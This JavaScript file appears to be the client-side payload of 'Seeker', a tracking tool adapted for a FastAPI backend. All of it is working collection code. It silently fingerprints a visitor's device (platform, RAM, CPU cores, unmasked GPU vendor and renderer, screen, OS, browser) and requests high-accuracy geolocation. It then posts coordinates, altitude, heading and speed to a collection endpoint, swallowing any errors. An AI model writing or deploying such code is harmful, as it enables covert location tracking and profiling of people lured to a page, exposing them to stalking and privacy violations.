/**
 * Seeker location.js - adapted for FastAPI backend
 * Uses fetch() instead of jQuery. API base must be set as window.SEEKER_API_BASE
 */
function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var brw;
  var os = ver;

  if (cc == undefined) cc = 'Not Available';
  if (ram == undefined) ram = 'Not Available';

  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else {
    brw = 'Not Available';
  }

  var ven = 'Not Available';
  var ren = 'Not Available';
  try {
    var canvas = document.createElement('canvas');
    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || ven;
        ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || ren;
      }
    }
  } catch (e) {}

  var ht = window.screen.height;
  var wd = window.screen.width;

  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) os = 'Not Available';
  os = os.trim();

  var apiBase = window.SEEKER_API_BASE || '/api/seeker';
  var params = new URLSearchParams({
    Ptf: ptf || '',
    Brw: brw || '',
    Cc: String(cc),
    Ram: String(ram),
    Ven: ven || '',
    Ren: ren || '',
    Ht: String(ht),
    Wd: String(wd),
    Os: os || ''
  });
  fetch(apiBase + '/info', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: params
  }).catch(function() {});
}

function locate(callback, errCallback) {
  if (!navigator.geolocation) {
    if (errCallback) errCallback({ code: 2 }, 'Geolocation not supported');
    return;
  }
  var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
  navigator.geolocation.getCurrentPosition(showPosition, showError, optn);

  function showError(error) {
    var err_text;
    var err_status = 'failed';
    switch (error.code) {
      case 1: err_text = 'User denied the request for Geolocation'; break;
      case 2: err_text = 'Location information is unavailable'; break;
      case 3: err_text = 'The request to get user location timed out'; break;
      default: err_text = 'An unknown error occurred';
    }
    var apiBase = window.SEEKER_API_BASE || '/api/seeker';
    var params = new URLSearchParams({ Status: err_status, Error: err_text });
    fetch(apiBase + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params
    }).then(function() { if (errCallback) errCallback(error, err_text); }).catch(function() {});
  }

  function showPosition(position) {
    var lat = position.coords.latitude ? (position.coords.latitude + ' deg') : 'Not Available';
    var lon = position.coords.longitude ? (position.coords.longitude + ' deg') : 'Not Available';
    var acc = position.coords.accuracy ? (position.coords.accuracy + ' m') : 'Not Available';
    var alt = position.coords.altitude ? (position.coords.altitude + ' m') : 'Not Available';
    var dir = position.coords.heading ? (position.coords.heading + ' deg') : 'Not Available';
    var spd = position.coords.speed ? (position.coords.speed + ' m/s') : 'Not Available';

    var params = new URLSearchParams({
      Status: 'success',
      Lat: lat,
      Lon: lon,
      Acc: acc,
      Alt: alt,
      Dir: dir,
      Spd: spd
    });
    var apiBase = window.SEEKER_API_BASE || '/api/seeker';
    fetch(apiBase + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params
    }).then(function() { if (callback) callback(); }).catch(function() {});
  }
}
